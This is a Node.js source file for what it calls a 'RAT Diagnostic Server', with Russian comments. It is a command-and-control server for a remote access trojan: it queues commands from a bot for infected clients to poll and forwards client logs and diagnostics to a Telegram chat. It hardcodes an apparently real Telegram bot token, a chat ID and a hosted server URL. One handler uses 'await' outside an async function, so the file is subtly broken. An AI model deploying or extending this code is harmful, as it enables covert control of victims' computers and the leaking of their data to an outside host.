// server.js
const http = require('http');
const fetch = require('node-fetch');

// Хранилище данных
let commandQueue = [];
let connectionLogs = [];
const TELEGRAM_BOT_TOKEN = "8079490877:AAEf1_SXzdbEjK88t6O4qyKhYnpE6U-hB44";
const TELEGRAM_CHAT_ID = "7581072357";

// Логирование с детализацией
function logAction(action, details, type = "INFO") {
    const timestamp = new Date().toLocaleString('ru-RU');
    const logEntry = {
        timestamp,
        action,
        details,
        type
    };
    
    console.log(`[${timestamp}] ${type}: ${action} - ${details}`);
    
    // Сохраняем последние 100 логов
    connectionLogs.push(logEntry);
    if (connectionLogs.length > 100) {
        connectionLogs = connectionLogs.slice(-100);
    }
    
    return logEntry;
}

// Функция отправки в Telegram
async function sendToTelegram(message) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        if (response.ok) {
            logAction("TELEGRAM_SEND", "Сообщение отправлено успешно");
            return true;
        } else {
            logAction("TELEGRAM_ERROR", `Ошибка ${response.status}`, "ERROR");
            return false;
        }
    } catch (error) {
        logAction("TELEGRAM_ERROR", error.message, "ERROR");
        return false;
    }
}

const server = http.createServer((req, res) => {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.setHeader('Content-Type', 'application/json');

    // Handle preflight
    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }

    const requestId = Math.random().toString(36).substr(2, 8);
    const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    logAction("REQUEST", `${req.method} ${req.url} from ${clientIP} [ID:${requestId}]`);

    if (req.method === 'POST' && req.url === '/client_command') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { command, args, client_id = "unknown" } = JSON.parse(body);
                
                logAction("BOT_COMMAND", `Команда от бота: ${command} ${JSON.stringify(args)} [Client: ${client_id}]`, "COMMAND");

                // Добавляем команду в очередь с меткой времени
                const commandData = {
                    command: command,
                    args: args || [],
                    timestamp: new Date().toISOString(),
                    id: requestId,
                    client_id: client_id,
                    received_at: Date.now()
                };

                commandQueue.push(commandData);

                // Ограничиваем размер очереди
                if (commandQueue.length > 50) {
                    commandQueue = commandQueue.slice(-50);
                }

                // Логируем состояние очереди
                logAction("QUEUE_STATUS", `Размер: ${commandQueue.length}, Последняя: ${command}`, "DEBUG");

                // Отправляем уведомление в Telegram о получении команды
                sendToTelegram(`<b>📨 Команда получена</b>\n<code>${command}</code>\nID: ${requestId}\nКлиент: ${client_id}`);

                res.end(JSON.stringify({ 
                    status: "OK", 
                    command: command,
                    queue_size: commandQueue.length,
                    request_id: requestId,
                    timestamp: new Date().toISOString()
                }));

            } catch (e) {
                logAction("PARSE_ERROR", `Ошибка парсинга: ${e.message}`, "ERROR");
                res.statusCode = 400;
                res.end(JSON.stringify({ 
                    error: "Invalid JSON", 
                    details: e.message,
                    request_id: requestId 
                }));
            }
        });
        return;
    }

    if (req.method === 'GET' && req.url === '/get_command') {
        const client_id = req.headers['client-id'] || "unknown";
        
        logAction("CLIENT_REQUEST", `Клиент запрашивает команду [Client: ${client_id}]`, "DEBUG");

        if (commandQueue.length > 0) {
            const command = commandQueue.shift();
            const delay = Date.now() - command.received_at;
            
            logAction("COMMAND_SENT", `Отправлена команда ${command.command} клиенту ${client_id} (задержка: ${delay}ms)`, "SUCCESS");

            res.end(JSON.stringify({
                ...command,
                server_time: new Date().toISOString(),
                processing_delay: delay
            }));
        } else {
            logAction("NO_COMMANDS", `Нет команд для клиента ${client_id}`, "DEBUG");
            res.end(JSON.stringify({ 
                command: "", 
                args: [],
                timestamp: new Date().toISOString(),
                message: "No commands in queue",
                request_id: requestId
            }));
        }
        return;
    }

    if (req.method === 'POST' && req.url === '/client_log') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { message, type = "INFO", client_id = "unknown" } = JSON.parse(body);
                logAction(`CLIENT_${type}`, `${message} [Client: ${client_id}]`, type);
                
                // Важные логи отправляем в Telegram
                if (type === "ERROR" || type === "SUCCESS") {
                    sendToTelegram(`<b>👤 Клиент ${client_id}</b>\n<code>${message}</code>`);
                }
                
                res.end(JSON.stringify({ status: "OK" }));
            } catch (e) {
                logAction("CLIENT_LOG_ERROR", e.message, "ERROR");
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid log data" }));
            }
        });
        return;
    }

    if (req.method === 'POST' && req.url === '/diagnostic') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                logAction("DIAGNOSTIC", `Диагностика от клиента: ${JSON.stringify(data)}`, "DEBUG");
                
                // Отправляем подробный отчет в Telegram
                sendToTelegram(`<b>🔍 ДИАГНОСТИКА</b>\n👤 Клиент: ${data.client_id || "unknown"}\n🕐 Время: ${new Date().toLocaleString('ru-RU')}\n📊 Статус: ${data.status || "N/A"}\n📝 Сообщение: ${data.message || "N/A"}`);
                
                res.end(JSON.stringify({ 
                    status: "OK", 
                    server_time: new Date().toISOString(),
                    queue_size: commandQueue.length 
                }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: "Invalid diagnostic data" }));
            }
        });
        return;
    }

    if (req.method === 'GET' && req.url === '/debug') {
        const debugInfo = {
            server: {
                status: "online",
                version: "2.2-diagnostic",
                uptime: process.uptime(),
                timestamp: new Date().toISOString()
            },
            queue: {
                size: commandQueue.length,
                recent_commands: commandQueue.slice(-5).map(cmd => ({
                    command: cmd.command,
                    client: cmd.client_id,
                    time: cmd.timestamp
                }))
            },
            connections: {
                total_requests: connectionLogs.length,
                recent_logs: connectionLogs.slice(-10)
            }
        };
        
        res.end(JSON.stringify(debugInfo, null, 2));
        return;
    }

    if (req.method === 'GET' && req.url === '/ping') {
        logAction("PING", `Ping запрос от ${clientIP}`, "DEBUG");
        res.end(JSON.stringify({ 
            status: "pong", 
            timestamp: new Date().toISOString(),
            server: "RAT Diagnostic Server",
            version: "2.2"
        }));
        return;
    }

    if (req.method === 'GET' && req.url === '/test_telegram') {
        const success = await sendToTelegram(`<b>🧪 ТЕСТ ТЕЛЕГРАМА</b>\nВремя: ${new Date().toLocaleString('ru-RU')}\nСервер: ${req.headers.host}`);
        res.end(JSON.stringify({ 
            telegram_test: success ? "SUCCESS" : "FAILED",
            timestamp: new Date().toISOString()
        }));
        return;
    }

    res.writeHead(404);
    res.end(JSON.stringify({ 
        error: "Endpoint not found",
        available_endpoints: [
            "POST /client_command - Отправить команду от бота",
            "GET /get_command - Получить команду для клиента", 
            "POST /client_log - Логи от клиента",
            "POST /diagnostic - Диагностика",
            "GET /debug - Отладочная информация",
            "GET /ping - Проверка связи",
            "GET /test_telegram - Тест Telegram"
        ]
    }));
});

// Обработка ошибок сервера
server.on('error', (error) => {
    logAction("SERVER_ERROR", error.message, "CRITICAL");
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 Диагностический сервер запущен на порту ${PORT}`);
    console.log(`📡 URL: https://ratserver-6wo3.onrender.com`);
    
    // Отправка уведомления о запуске
    sendToTelegram(`<b>🟢 ДИАГНОСТИЧЕСКИЙ СЕРВЕР ЗАПУЩЕН</b>\n📍 Port: ${PORT}\n⏰ ${new Date().toLocaleString('ru-RU')}\n🔧 Режим: Диагностика`);
});

module.exports = server;
